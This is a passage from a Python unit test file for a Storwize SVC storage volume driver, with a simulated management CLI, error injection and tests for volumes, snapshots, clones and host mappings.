                return self._errors['CMMVC5754E']
            host = self._hosts_list[kwargs['obj']]
            rows = []
            rows.append(['id', host['id']])
            rows.append(['name', host['host_name']])
            rows.append(['port_count', '1'])
            rows.append(['type', 'generic'])
            rows.append(['mask', '1111'])
            rows.append(['iogrp_count', '4'])
            rows.append(['status', 'online'])
            for port in host['iscsi_names']:
                rows.append(['iscsi_name', port])
                rows.append(['node_logged_in_count', '0'])
                rows.append(['state', 'offline'])
            for port in host['wwpns']:
                rows.append(['WWPN', port])
                rows.append(['node_logged_in_count', '0'])
                rows.append(['state', 'active'])

            if 'nohdr' in kwargs:
                for index in range(len(rows)):
                    rows[index] = ' '.join(rows[index][1:])

            if 'delim' in kwargs:
                for index in range(len(rows)):
                    rows[index] = kwargs['delim'].join(rows[index])

            return ('%s' % '\n'.join(rows), '')

    # List iSCSI authorization information about hosts
    def _cmd_lsiscsiauth(self, **kwargs):
        if self._next_cmd_error['lsiscsiauth'] == 'no_info':
            self._next_cmd_error['lsiscsiauth'] = ''
            return ('', '')
        rows = []
        rows.append(['type', 'id', 'name', 'iscsi_auth_method',
                     'iscsi_chap_secret'])

        for k, host in self._hosts_list.iteritems():
            method = 'none'
            secret = ''
            if 'chapsecret' in host:
                method = 'chap'
                secret = host['chapsecret']
            rows.append(['host', host['id'], host['host_name'], method,
                         secret])
        return self._print_info_cmd(rows=rows, **kwargs)

    # Create a vdisk-host mapping
    def _cmd_mkvdiskhostmap(self, **kwargs):
        mapping_info = {}
        mapping_info['id'] = self._find_unused_id(self._mappings_list)

        if 'host' not in kwargs:
            return self._errors['CMMVC5707E']
        mapping_info['host'] = kwargs['host'].strip('\'\'')

        if 'scsi' not in kwargs:
            return self._errors['CMMVC5707E']
        mapping_info['lun'] = kwargs['scsi'].strip('\'\'')

        if 'obj' not in kwargs:
            return self._errors['CMMVC5707E']
        mapping_info['vol'] = kwargs['obj'].strip('\'\'')

        if mapping_info['vol'] not in self._volumes_list:
            return self._errors['CMMVC5753E']

        if mapping_info['host'] not in self._hosts_list:
            return self._errors['CMMVC5754E']

        if mapping_info['vol'] in self._mappings_list:
            return self._errors['CMMVC6071E']

        for k, v in self._mappings_list.iteritems():
            if ((v['host'] == mapping_info['host']) and
                    (v['lun'] == mapping_info['lun'])):
                return self._errors['CMMVC5879E']

        for k, v in self._mappings_list.iteritems():
            if (v['lun'] == mapping_info['lun']) and ('force' not in kwargs):
                return self._errors['CMMVC6071E']

        self._mappings_list[mapping_info['id']] = mapping_info
        return ('Virtual Disk to Host map, id [%s], successfully created'
                % (mapping_info['id']), '')

    # Delete a vdisk-host mapping
    def _cmd_rmvdiskhostmap(self, **kwargs):
        if 'host' not in kwargs:
            return self._errors['CMMVC5707E']
        host = kwargs['host'].strip('\'\'')

        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        vol = kwargs['obj'].strip('\'\'')

        mapping_ids = []
        for k, v in self._mappings_list.iteritems():
            if v['vol'] == vol:
                mapping_ids.append(v['id'])
        if not mapping_ids:
            return self._errors['CMMVC5753E']

        this_mapping = None
        for mapping_id in mapping_ids:
            if self._mappings_list[mapping_id]['host'] == host:
                this_mapping = mapping_id
        if this_mapping == None:
            return self._errors['CMMVC5753E']

        del self._mappings_list[this_mapping]
        return ('', '')

    # List information about vdisk-host mappings
    def _cmd_lshostvdiskmap(self, **kwargs):
        index = 1
        no_hdr = 0
        delimeter = ''
        host_name = kwargs['obj']

        if host_name not in self._hosts_list:
            return self._errors['CMMVC5754E']

        rows = []
        rows.append(['id', 'name', 'SCSI_id', 'vdisk_id', 'vdisk_name',
                     'vdisk_UID'])

        for k, mapping in self._mappings_list.iteritems():
            if (host_name == '') or (mapping['host'] == host_name):
                volume = self._volumes_list[mapping['vol']]
                rows.append([mapping['id'], mapping['host'],
                            mapping['lun'], volume['id'],
                            volume['name'], volume['uid']])

        return self._print_info_cmd(rows=rows, **kwargs)

    # Create a FlashCopy mapping
    def _cmd_mkfcmap(self, **kwargs):
        source = ''
        target = ''
        copyrate = kwargs['copyrate'] if 'copyrate' in kwargs else '50'

        if 'source' not in kwargs:
            return self._errors['CMMVC5707E']
        source = kwargs['source'].strip('\'\'')
        if source not in self._volumes_list:
            return self._errors['CMMVC5754E']

        if 'target' not in kwargs:
            return self._errors['CMMVC5707E']
        target = kwargs['target'].strip('\'\'')
        if target not in self._volumes_list:
            return self._errors['CMMVC5754E']

        if source == target:
            return self._errors['CMMVC6303E']

        if (self._volumes_list[source]['capacity'] !=
                self._volumes_list[target]['capacity']):
            return self._errors['CMMVC5924E']

        fcmap_info = {}
        fcmap_info['source'] = source
        fcmap_info['target'] = target
        fcmap_info['id'] = self._find_unused_id(self._fcmappings_list)
        fcmap_info['name'] = 'fcmap' + fcmap_info['id']
        fcmap_info['copyrate'] = copyrate
        fcmap_info['progress'] = '0'
        fcmap_info['autodelete'] = True if 'autodelete' in kwargs else False
        fcmap_info['status'] = 'idle_or_copied'
        self._fcmappings_list[fcmap_info['id']] = fcmap_info

        return('FlashCopy Mapping, id [' + fcmap_info['id'] +
               '], successfully created', '')

    def _cmd_gen_prestartfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']

        if self._next_cmd_error['prestartfcmap'] == 'bad_id':
            id_num = -1
            self._next_cmd_error['prestartfcmap'] = ''

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        return self._state_transition('prepare', fcmap)

    def _cmd_gen_startfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']

        if self._next_cmd_error['startfcmap'] == 'bad_id':
            id_num = -1
            self._next_cmd_error['startfcmap'] = ''

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        return self._state_transition('start', fcmap)

    def _cmd_stopfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        return self._state_transition('stop', fcmap)

    def _cmd_rmfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5701E']
        id_num = kwargs['obj']
        force = True if 'force' in kwargs else False

        if self._next_cmd_error['rmfcmap'] == 'bad_id':
            id_num = -1
            self._next_cmd_error['rmfcmap'] = ''

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        function = 'delete_force' if force else 'delete'
        ret = self._state_transition(function, fcmap)
        if fcmap['status'] == 'end':
            del self._fcmappings_list[id_num]
        return ret

    def _cmd_lsvdiskfcmappings(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5707E']
        vdisk = kwargs['obj']
        rows = []
        rows.append(['id', 'name'])
        for k, v in self._fcmappings_list.iteritems():
            if v['source'] == vdisk or v['target'] == vdisk:
                rows.append([v['id'], v['name']])
        return self._print_info_cmd(rows=rows, **kwargs)

    def _cmd_chfcmap(self, **kwargs):
        if 'obj' not in kwargs:
            return self._errors['CMMVC5707E']
        id_num = kwargs['obj']

        try:
            fcmap = self._fcmappings_list[id_num]
        except KeyError:
            return self._errors['CMMVC5753E']

        for key in ['name', 'copyrate', 'autodelete']:
            if key in kwargs:
                fcmap[key] = kwargs[key]
        return ('', '')

    def _cmd_lsfcmap(self, **kwargs):
        rows = []
        rows.append(['id', 'name', 'source_vdisk_id', 'source_vdisk_name',
                     'target_vdisk_id', 'target_vdisk_name', 'group_id',
                     'group_name', 'status', 'progress', 'copy_rate',
                     'clean_progress', 'incremental', 'partner_FC_id',
                     'partner_FC_name', 'restoring', 'start_time',
                     'rc_controlled'])

        # Assume we always get a filtervalue argument
        filter_key = kwargs['filtervalue'].split('=')[0]
        filter_value = kwargs['filtervalue'].split('=')[1]
        to_delete = []
        for k, v in self._fcmappings_list.iteritems():
            if str(v[filter_key]) == filter_value:
                source = self._volumes_list[v['source']]
                target = self._volumes_list[v['target']]
                self._state_transition('wait', v)

                if self._next_cmd_error['lsfcmap'] == 'speed_up':
                    self._next_cmd_error['lsfcmap'] = ''
                    curr_state = v['status']
                    while self._state_transition('wait', v) == ("""", """"):
                        if curr_state == v['status']:
                            break
                        curr_state = v['status']

                if ((v['status'] == 'idle_or_copied' and v['autodelete'] and
                     v['progress'] == '100') or (v['status'] == 'end')):
                    to_delete.append(k)
                else:
                    rows.append([v['id'], v['name'], source['id'],
                                source['name'], target['id'], target['name'],
                                '', '', v['status'], v['progress'],
                                v['copyrate'], '100', 'off', '', '', 'no', '',
                                'no'])

        for d in to_delete:
            del self._fcmappings_list[k]

        return self._print_info_cmd(rows=rows, **kwargs)

    # Add host to list
    def _add_host_to_list(self, connector):
        host_info = {}
        host_info['id'] = self._find_unused_id(self._hosts_list)
        host_info['host_name'] = connector['host']
        host_info['iscsi_names'] = []
        host_info['wwpns'] = []
        if 'initiator' in connector:
            host_info['iscsi_names'].append(connector['initiator'])
        if 'wwpns' in connector:
            host_info['wwpns'] = host_info['wwpns'] + connector['wwpns']
        self._hosts_list[connector['host']] = host_info

    # The main function to run commands on the management simulator
    def execute_command(self, cmd, check_exit_code=True):
        try:
            kwargs = self._cmd_to_dict(cmd)
        except IndexError:
            return self._errors['CMMVC5707E']

        command = kwargs['cmd']
        del kwargs['cmd']

        if command == 'lsmdiskgrp':
            out, err = self._cmd_lsmdiskgrp(**kwargs)
        elif command == 'lslicense':
            out, err = self._cmd_lslicense(**kwargs)
        elif command == 'lssystem':
            out, err = self._cmd_lssystem(**kwargs)
        elif command == 'lsnodecanister':
            out, err = self._cmd_lsnodecanister(**kwargs)
        elif command == 'lsnode':
            out, err = self._cmd_lsnode(**kwargs)
        elif command == 'lsportip':
            out, err = self._cmd_lsportip(**kwargs)
        elif command == 'lsfabric':
            out, err = self._cmd_lsfabric(**kwargs)
        elif command == 'mkvdisk':
            out, err = self._cmd_mkvdisk(**kwargs)
        elif command == 'rmvdisk':
            out, err = self._cmd_rmvdisk(**kwargs)
        elif command == 'expandvdisksize':
            out, err = self._cmd_expandvdisksize(**kwargs)
        elif command == 'lsvdisk':
            out, err = self._cmd_lsvdisk(**kwargs)
        elif command == 'mkhost':
            out, err = self._cmd_mkhost(**kwargs)
        elif command == 'addhostport':
            out, err = self._cmd_addhostport(**kwargs)
        elif command == 'chhost':
            out, err = self._cmd_chhost(**kwargs)
        elif command == 'rmhost':
            out, err = self._cmd_rmhost(**kwargs)
        elif command == 'lshost':
            out, err = self._cmd_lshost(**kwargs)
        elif command == 'lsiscsiauth':
            out, err = self._cmd_lsiscsiauth(**kwargs)
        elif command == 'mkvdiskhostmap':
            out, err = self._cmd_mkvdiskhostmap(**kwargs)
        elif command == 'rmvdiskhostmap':
            out, err = self._cmd_rmvdiskhostmap(**kwargs)
        elif command == 'lshostvdiskmap':
            out, err = self._cmd_lshostvdiskmap(**kwargs)
        elif command == 'mkfcmap':
            out, err = self._cmd_mkfcmap(**kwargs)
        elif command == 'prestartfcmap':
            out, err = self._cmd_gen_prestartfcmap(**kwargs)
        elif command == 'startfcmap':
            out, err = self._cmd_gen_startfcmap(**kwargs)
        elif command == 'stopfcmap':
            out, err = self._cmd_stopfcmap(**kwargs)
        elif command == 'rmfcmap':
            out, err = self._cmd_rmfcmap(**kwargs)
        elif command == 'chfcmap':
            out, err = self._cmd_chfcmap(**kwargs)
        elif command == 'lsfcmap':
            out, err = self._cmd_lsfcmap(**kwargs)
        elif command == 'lsvdiskfcmappings':
            out, err = self._cmd_lsvdiskfcmappings(**kwargs)
        else:
            out, err = ('', 'ERROR: Unsupported command')

        if (check_exit_code) and (len(err) != 0):
            raise exception.ProcessExecutionError(exit_code=1,
                                                  stdout=out,
                                                  stderr=err,
                                                  cmd=' '.join(cmd))

        return (out, err)

    # After calling this function, the next call to the specified command will
    # result in in the error specified
    def error_injection(self, cmd, error):
        self._next_cmd_error[cmd] = error


class StorwizeSVCFakeDriver(storwize_svc.StorwizeSVCDriver):
    def __init__(self, *args, **kwargs):
        super(StorwizeSVCFakeDriver, self).__init__(*args, **kwargs)

    def set_fake_storage(self, fake):
        self.fake_storage = fake

    def _run_ssh(self, cmd, check_exit_code=True):
        try:
            LOG.debug(_('Run CLI command: %s') % cmd)
            ret = self.fake_storage.execute_command(cmd, check_exit_code)
            (stdout, stderr) = ret
            LOG.debug(_('CLI output:\n stdout: %(stdout)s\n stderr: '
                        '%(stderr)s') % {'stdout': stdout, 'stderr': stderr})

        except exception.ProcessExecutionError as e:
            with excutils.save_and_reraise_exception():
                LOG.debug(_('CLI Exception output:\n stdout: %(out)s\n '
                            'stderr: %(err)s') % {'out': e.stdout,
                                                  'err': e.stderr})

        return ret


class StorwizeSVCFakeSock:
    def settimeout(self, time):
        return


class StorwizeSVCDriverTestCase(test.TestCase):
    def setUp(self):
        super(StorwizeSVCDriverTestCase, self).setUp()
        self.USESIM = True
        if self.USESIM:
            self.driver = StorwizeSVCFakeDriver(
                configuration=conf.Configuration(None))
            self._def_flags = {'san_ip': 'hostname',
                               'san_login': 'user',
                               'san_password': 'pass',
                               'storwize_svc_flashcopy_timeout': 20,
                               # Test ignore capitalization
                               'storwize_svc_connection_protocol': 'iScSi',
                               'storwize_svc_multipath_enabled': False}
            wwpns = [str(random.randint(0, 9999999999999999)).zfill(16),
                     str(random.randint(0, 9999999999999999)).zfill(16)]
            initiator = 'test.initiator.%s' % str(random.randint(10000, 99999))
            self._connector = {'ip': '1.234.56.78',
                               'host': 'storwize-svc-test',
                               'wwpns': wwpns,
                               'initiator': initiator}
            self.sim = StorwizeSVCManagementSimulator('volpool')

            self.driver.set_fake_storage(self.sim)
        else:
            self.driver = storwize_svc.StorwizeSVCDriver(
                configuration=conf.Configuration(None))
            self._def_flags = {'san_ip': '1.111.11.11',
                               'san_login': 'user',
                               'san_password': 'password',
                               'storwize_svc_volpool_name': 'openstack',
                               # Test ignore capitalization
                               'storwize_svc_connection_protocol': 'iScSi',
                               'storwize_svc_multipath_enabled': False,
                               'ssh_conn_timeout': 0}
            config_group = self.driver.configuration.config_group
            self.driver.configuration.set_override('rootwrap_config',
                                                   '/etc/cinder/rootwrap.conf',
                                                   config_group)
            self._connector = connector.get_connector_properties()

        self._reset_flags()
        self.driver.db = StorwizeSVCFakeDB()
        self.driver.do_setup(None)
        self.driver.check_for_setup_error()
        self.stubs.Set(storwize_svc.time, 'sleep', lambda s: None)

    def _set_flag(self, flag, value):
        group = self.driver.configuration.config_group
        self.driver.configuration.set_override(flag, value, group)

    def _reset_flags(self):
        self.driver.configuration.local_conf.reset()
        for k, v in self._def_flags.iteritems():
            self._set_flag(k, v)

    def _assert_vol_exists(self, name, exists):
        is_vol_defined = self.driver._is_vdisk_defined(name)
        self.assertEqual(is_vol_defined, exists)

    def test_storwize_svc_connectivity(self):
        # Make sure we detect if the pool doesn't exist
        no_exist_pool = 'i-dont-exist-%s' % random.randint(10000, 99999)
        self._set_flag('storwize_svc_volpool_name', no_exist_pool)
        self.assertRaises(exception.InvalidInput,
                          self.driver.do_setup, None)
        self._reset_flags()

        # Check the case where the user didn't configure IP addresses
        # as well as receiving unexpected results from the storage
        if self.USESIM:
            self.sim.error_injection('lsnodecanister', 'header_mismatch')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)
            self.sim.error_injection('lsnodecanister', 'remove_field')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)
            self.sim.error_injection('lsportip', 'header_mismatch')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)
            self.sim.error_injection('lsportip', 'remove_field')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.do_setup, None)

        # Check with bad parameters
        self._set_flag('san_ip', '')
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('san_password', None)
        self._set_flag('san_private_key', None)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_rsize', 101)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_warning', 101)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_grainsize', 42)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_flashcopy_timeout', 601)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_vol_compression', True)
        self._set_flag('storwize_svc_vol_rsize', -1)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_connection_protocol', 'foo')
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        self._set_flag('storwize_svc_connection_protocol', 'iSCSI')
        self._set_flag('storwize_svc_multipath_enabled', True)
        self.assertRaises(exception.InvalidInput,
                          self.driver.check_for_setup_error)
        self._reset_flags()

        if self.USESIM:
            self.sim.error_injection('lslicense', 'no_compression')
            self._set_flag('storwize_svc_vol_compression', True)
            self.driver.do_setup(None)
            self.assertRaises(exception.InvalidInput,
                              self.driver.check_for_setup_error)
            self._reset_flags()

        # Finally, check with good parameters
        self.driver.do_setup(None)

    def _generate_vol_info(self, vol_name, vol_id):
        rand_id = str(random.randint(10000, 99999))
        if vol_name:
            return {'name': 'snap_volume%s' % rand_id,
                    'volume_name': vol_name,
                    'id': rand_id,
                    'volume_id': vol_id,
                    'volume_size': 10}
        else:
            return {'name': 'test_volume%s' % rand_id,
                    'size': 10,
                    'id': '%s' % rand_id,
                    'volume_type_id': None}

    def _create_test_vol(self, opts):
        ctxt = context.get_admin_context()
        type_ref = volume_types.create(ctxt, 'testtype', opts)
        volume = self._generate_vol_info(None, None)
        volume['volume_type_id'] = type_ref['id']
        self.driver.create_volume(volume)

        attrs = self.driver._get_vdisk_attributes(volume['name'])
        self.driver.delete_volume(volume)
        volume_types.destroy(ctxt, type_ref['id'])
        return attrs

    def _fail_prepare_fc_map(self, fc_map_id, source, target):
        raise exception.ProcessExecutionError(exit_code=1,
                                              stdout='',
                                              stderr='unit-test-fail',
                                              cmd='prestartfcmap id')

    def test_storwize_svc_snapshots(self):
        vol1 = self._generate_vol_info(None, None)
        self.driver.create_volume(vol1)
        self.driver.db.volume_set(vol1)
        snap1 = self._generate_vol_info(vol1['name'], vol1['id'])

        # Test timeout and volume cleanup
        self._set_flag('storwize_svc_flashcopy_timeout', 1)
        self.assertRaises(exception.InvalidSnapshot,
                          self.driver.create_snapshot, snap1)
        self._assert_vol_exists(snap1['name'], False)
        self._reset_flags()

        # Test prestartfcmap, startfcmap, and rmfcmap failing
        orig = self.driver._call_prepare_fc_map
        self.driver._call_prepare_fc_map = self._fail_prepare_fc_map
        self.assertRaises(exception.ProcessExecutionError,
                          self.driver.create_snapshot, snap1)
        self.driver._call_prepare_fc_map = orig

        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
            self.sim.error_injection('startfcmap', 'bad_id')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_snapshot, snap1)
            self._assert_vol_exists(snap1['name'], False)
            self.sim.error_injection('prestartfcmap', 'bad_id')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_snapshot, snap1)
            self._assert_vol_exists(snap1['name'], False)

        # Test successful snapshot
        self.driver.create_snapshot(snap1)
        self._assert_vol_exists(snap1['name'], True)

        # Try to create a snapshot from an non-existing volume - should fail
        snap_novol = self._generate_vol_info('undefined-vol', '12345')
        self.assertRaises(exception.VolumeNotFound,
                          self.driver.create_snapshot,
                          snap_novol)

        # We support deleting a volume that has snapshots, so delete the volume
        # first
        self.driver.delete_volume(vol1)
        self.driver.delete_snapshot(snap1)

    def test_storwize_svc_create_volfromsnap_clone(self):
        vol1 = self._generate_vol_info(None, None)
        self.driver.create_volume(vol1)
        self.driver.db.volume_set(vol1)
        snap1 = self._generate_vol_info(vol1['name'], vol1['id'])
        self.driver.create_snapshot(snap1)
        vol2 = self._generate_vol_info(None, None)
        vol3 = self._generate_vol_info(None, None)

        # Try to create a volume from a non-existing snapshot
        snap_novol = self._generate_vol_info('undefined-vol', '12345')
        vol_novol = self._generate_vol_info(None, None)
        self.assertRaises(exception.SnapshotNotFound,
                          self.driver.create_volume_from_snapshot,
                          vol_novol,
                          snap_novol)

        # Fail the snapshot
        orig = self.driver._call_prepare_fc_map
        self.driver._call_prepare_fc_map = self._fail_prepare_fc_map
        self.assertRaises(exception.ProcessExecutionError,
                          self.driver.create_volume_from_snapshot,
                          vol2, snap1)
        self.driver._call_prepare_fc_map = orig
        self._assert_vol_exists(vol2['name'], False)

        # Try to create where source size != target size
        vol2['size'] += 1
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.create_volume_from_snapshot,
                          vol2, snap1)
        self._assert_vol_exists(vol2['name'], False)
        vol2['size'] -= 1

        # Succeed
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_volume_from_snapshot(vol2, snap1)
        self._assert_vol_exists(vol2['name'], True)

        # Try to clone where source size != target size
        vol3['size'] += 1
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.create_cloned_volume,
                          vol3, vol2)
        self._assert_vol_exists(vol3['name'], False)
        vol3['size'] -= 1

        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_cloned_volume(vol3, vol2)
        self._assert_vol_exists(vol3['name'], True)

        # Delete in the 'opposite' order to make sure it works
        self.driver.delete_volume(vol3)
        self._assert_vol_exists(vol3['name'], False)
        self.driver.delete_volume(vol2)
        self._assert_vol_exists(vol2['name'], False)
        self.driver.delete_snapshot(snap1)
        self._assert_vol_exists(snap1['name'], False)
        self.driver.delete_volume(vol1)
        self._assert_vol_exists(vol1['name'], False)

    def test_storwize_svc_volumes(self):
        # Create a first volume
        volume = self._generate_vol_info(None, None)
        self.driver.create_volume(volume)

        self.driver.ensure_export(None, volume)

        # Do nothing
        self.driver.create_export(None, volume)
        self.driver.remove_export(None, volume)

        # Make sure volume attributes are as they should be
        attributes = self.driver._get_vdisk_attributes(volume['name'])
        attr_size = float(attributes['capacity']) / (1024 ** 3)  # bytes to GB
        self.assertEqual(attr_size, float(volume['size']))
        pool = self.driver.configuration.local_conf.storwize_svc_volpool_name
        self.assertEqual(attributes['mdisk_grp_name'], pool)

        # Try to create the volume again (should fail)
        self.assertRaises(exception.ProcessExecutionError,
                          self.driver.create_volume,
                          volume)

        # Try to delete a volume that doesn't exist (should not fail)
        vol_no_exist = {'name': 'i_dont_exist'}
        self.driver.delete_volume(vol_no_exist)
        # Ensure export for volume that doesn't exist (should not fail)
        self.driver.ensure_export(None, vol_no_exist)

        # Delete the volume
        self.driver.delete_volume(volume)

    def test_storwize_svc_volume_params(self):
        # Option test matrix
        # Option        Value   Covered by test #
        # rsize         -1      1
        # rsize         2       2,3
        # warning       0       2
        # warning       80      3
        # autoexpand    True    2
        # autoexpand    False   3
        # grainsize     32      2
        # grainsize     256     3
        # compression   True    4
        # compression   False   2,3
        # easytier      True    1,3
        # easytier      False   2

        opts_list = []
        chck_list = []
        opts_list.append({'rsize': -1, 'easytier': True})
        chck_list.append({'free_capacity': '0', 'easy_tier': 'on'})
        opts_list.append({'rsize': 2, 'compression': False, 'warning': 0,
                          'autoexpand': True, 'grainsize': 32,
                          'easytier': False})
        chck_list.append({'-free_capacity': '0', 'compressed_copy': 'no',
                          'warning': '0', 'autoexpand': 'on',
                          'grainsize': '32', 'easy_tier': 'off'})
        opts_list.append({'rsize': 2, 'compression': False, 'warning': 80,
                          'autoexpand': False, 'grainsize': 256,
                          'easytier': True})
        chck_list.append({'-free_capacity': '0', 'compressed_copy': 'no',
                          'warning': '80', 'autoexpand': 'off',
                          'grainsize': '256', 'easy_tier': 'on'})
        opts_list.append({'rsize': 2, 'compression': True})
        chck_list.append({'-free_capacity': '0',
                          'compressed_copy': 'yes'})

        for idx in range(len(opts_list)):
            attrs = self._create_test_vol(opts_list[idx])
            for k, v in chck_list[idx].iteritems():
                try:
                    if k[0] == '-':
                        k = k[1:]
                        self.assertNotEqual(attrs[k], v)
                    else:
                        self.assertEqual(attrs[k], v)
                except exception.ProcessExecutionError as e:
                    if 'CMMVC7050E' not in e.stderr:
                        raise

    def test_storwize_svc_unicode_host_and_volume_names(self):
        # We'll check with iSCSI only - nothing protocol-dependednt here
        self._set_flag('storwize_svc_connection_protocol', 'iSCSI')
        self.driver.do_setup(None)

        rand_id = random.randint(10000, 99999)
        volume1 = {'name': u'unicode1_volume%s' % rand_id,
                   'size': 2,
                   'id': 1,
                   'volume_type_id': None}
        self.driver.create_volume(volume1)
        self._assert_vol_exists(volume1['name'], True)

        self.assertRaises(exception.NoValidHost,
                          self.driver._connector_to_hostname_prefix,
                          {'host': 12345})

        # Add a a host first to make life interesting (this host and
        # conn['host'] should be translated to the same prefix, and the
        # initiator should differentiate
        tmpconn1 = {'initiator': u'unicode:initiator1.%s' % rand_id,
                    'ip': '10.10.10.10',
                    'host': u'unicode.foo}.bar{.baz-%s' % rand_id}
        self.driver._create_host(tmpconn1)

        # Add a host with a different prefix
        tmpconn2 = {'initiator': u'unicode:initiator2.%s' % rand_id,
                    'ip': '10.10.10.11',
                    'host': u'unicode.hello.world-%s' % rand_id}
        self.driver._create_host(tmpconn2)

        conn = {'initiator': u'unicode:initiator3.%s' % rand_id,
                'ip': '10.10.10.12',
                'host': u'unicode.foo}.bar}.baz-%s' % rand_id}
        self.driver.initialize_connection(volume1, conn)
        host_name = self.driver._get_host_from_connector(conn)
        self.assertNotEqual(host_name, None)
        self.driver.terminate_connection(volume1, conn)
        host_name = self.driver._get_host_from_connector(conn)
        self.assertEqual(host_name, None)
        self.driver.delete_volume(volume1)

        # Clean up temporary hosts
        for tmpconn in [tmpconn1, tmpconn2]:
            host_name = self.driver._get_host_from_connector(tmpconn)
            self.assertNotEqual(host_name, None)
            self.driver._delete_host(host_name)

    def test_storwize_svc_validate_connector(self):
        conn_neither = {'host': 'host'}
        conn_iscsi = {'host': 'host', 'initiator': 'foo'}
        conn_fc = {'host': 'host', 'wwpns': 'bar'}
        conn_both = {'host': 'host', 'initiator': 'foo', 'wwpns': 'bar'}

        self.driver._enabled_protocols = set(['iSCSI'])
        self.driver.validate_connector(conn_iscsi)
        self.driver.validate_connector(conn_both)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_fc)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_neither)

        self.driver._enabled_protocols = set(['FC'])
        self.driver.validate_connector(conn_fc)
        self.driver.validate_connector(conn_both)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_iscsi)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_neither)

        self.driver._enabled_protocols = set(['iSCSI', 'FC'])
        self.driver.validate_connector(conn_iscsi)
        self.driver.validate_connector(conn_fc)
        self.driver.validate_connector(conn_both)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.validate_connector, conn_neither)

    def test_storwize_svc_host_maps(self):
        # Create two volumes to be used in mappings

        ctxt = context.get_admin_context()
        volume1 = self._generate_vol_info(None, None)
        self.driver.create_volume(volume1)
        volume2 = self._generate_vol_info(None, None)
        self.driver.create_volume(volume2)

        # Create volume types that we created
        types = {}
        for protocol in ['FC', 'iSCSI']:
            opts = {'storage_protocol': '<in> ' + protocol}
            types[protocol] = volume_types.create(ctxt, protocol, opts)

        for protocol in ['FC', 'iSCSI']:
            volume1['volume_type_id'] = types[protocol]['id']
            volume2['volume_type_id'] = types[protocol]['id']

            # Check case where no hosts exist
            if self.USESIM:
                ret = self.driver._get_host_from_connector(self._connector)
                self.assertEqual(ret, None)

            # Make sure that the volumes have been created
            self._assert_vol_exists(volume1['name'], True)
            self._assert_vol_exists(volume2['name'], True)

            # Initialize connection from the first volume to a host
            self.driver.initialize_connection(volume1, self._connector)

            # Initialize again, should notice it and do nothing
            self.driver.initialize_connection(volume1, self._connector)

            # Try to delete the 1st volume (should fail because it is mapped)
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.delete_volume,
                              volume1)

            # Check bad output from lsfabric for the 2nd volume
            if protocol == 'FC' and self.USESIM:
                for error in ['remove_field', 'header_mismatch']:
                    self.sim.error_injection('lsfabric', error)
                    self.assertRaises(exception.VolumeBackendAPIException,
                                      self.driver.initialize_connection,
                                      volume2, self._connector)

            self.driver.terminate_connection(volume1, self._connector)
            if self.USESIM:
                ret = self.driver._get_host_from_connector(self._connector)
                self.assertEqual(ret, None)

        # Check cases with no auth set for host
        if self.USESIM:
            for case in ['no_info', 'no_auth_set']:
                conn_na = {'initiator': 'test:init:%s' %
                                        random.randint(10000, 99999),
                           'ip': '11.11.11.11',
                           'host': 'host-%s' % case}
                self.sim._add_host_to_list(conn_na)
                volume1['volume_type_id'] = types['iSCSI']['id']
                if case == 'no_info':
                    self.sim.error_injection('lsiscsiauth', 'no_info')
                self.driver.initialize_connection(volume1, conn_na)
                ret = self.driver._get_chap_secret_for_host(conn_na['host'])
                self.assertNotEqual(ret, None)
                self.driver.terminate_connection(volume1, conn_na)

        # Test no preferred node
        if self.USESIM:
            self.sim.error_injection('lsvdisk', 'no_pref_node')
            self.assertRaises(exception.VolumeBackendAPIException,
                              self.driver.initialize_connection,
                              volume1, self._connector)

        # Initialize connection from the second volume to the host with no
